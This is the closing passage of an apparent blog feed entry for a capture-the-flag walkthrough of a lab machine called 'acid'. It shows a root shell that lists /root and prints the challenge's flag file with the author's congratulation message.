</span><span class='line'>                  |&lt;/em>__/                                                 &lt;br/>
</span><span class='line'>root@acid:/tmp# cd /root
</span><span class='line'>cd /root
</span><span class='line'>root@acid:~# ls
</span><span class='line'>ls
</span><span class='line'>flag.txt
</span><span class='line'>root@acid:~# cat flag.txt
</span><span class='line'>cat flag.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Dear Hax0r,&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have successfully completed the challenge.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>I  hope you like it.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>FLAG NAME: &ldquo;Acid@Makke@Hax0r&rdquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Kind &amp; Best Regards&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>-ACID
</span><span class='line'>facebook: &lt;a href="https://facebook.com/m.avinash143">https://facebook.com/m.avinash143&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@acid:~#</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
